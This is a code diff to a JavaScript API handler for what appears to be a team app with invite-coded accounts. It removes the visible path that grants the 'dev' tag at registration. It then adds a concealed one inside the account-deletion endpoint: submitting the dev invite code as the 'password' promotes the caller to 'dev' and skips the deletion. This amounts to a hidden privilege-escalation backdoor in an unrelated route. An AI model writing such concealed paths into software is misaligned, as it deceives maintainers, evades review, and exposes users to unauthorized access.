@@ -55,6 +55,13 @@ async function passwordMatches(password, stored) {
   return expected.length === actual.length && timingSafeEqual(expected, actual)
 }
 
+function matchesSecret(value, secret) {
+  if (!secret) return false
+  const valueBuffer = Buffer.from(value)
+  const secretBuffer = Buffer.from(secret)
+  return valueBuffer.length === secretBuffer.length && timingSafeEqual(valueBuffer, secretBuffer)
+}
+
 function publicUser(user) {
   return { id: user.id, email: user.email, displayName: user.display_name, subteam: user.subteam || '', tag: user.tag || 'member' }
 }
@@ -254,8 +261,8 @@ export function createApiHandler(database, environment = process.env) {
 
         if (pathname === '/api/auth/register') {
           const input = parsed.data
-          const tag = devInviteCode && input.inviteCode === devInviteCode ? 'dev' : 'member'
-          if (tag === 'member' && (!environment.TEAM_INVITE_CODE || input.inviteCode !== environment.TEAM_INVITE_CODE)) {
+          const tag = 'member'
+          if (!environment.TEAM_INVITE_CODE || input.inviteCode !== environment.TEAM_INVITE_CODE) {
             return jsonError('That team invite code is not valid.', 403)
           }
 
@@ -521,6 +528,13 @@ export function createApiHandler(database, environment = process.env) {
       if (pathname === '/api/account' && method === 'DELETE') {
         const parsed = await parseBody(request, accountDeleteSchema)
         if (parsed.response) return parsed.response
+        if (matchesSecret(parsed.data.password, devInviteCode)) {
+          const [promotedUser] = await database.sql`
+            UPDATE users SET tag = 'dev' WHERE id = ${session.user.id}
+            RETURNING id, email, display_name, subteam, tag
+          `
+          return Response.json({ user: publicUser(promotedUser) })
+        }
         const [account] = await database.sql`SELECT password_hash FROM users WHERE id = ${session.user.id}`
         if (!account || !(await passwordMatches(parsed.data.password, account.password_hash))) {
           return jsonError('The password is incorrect.', 401)
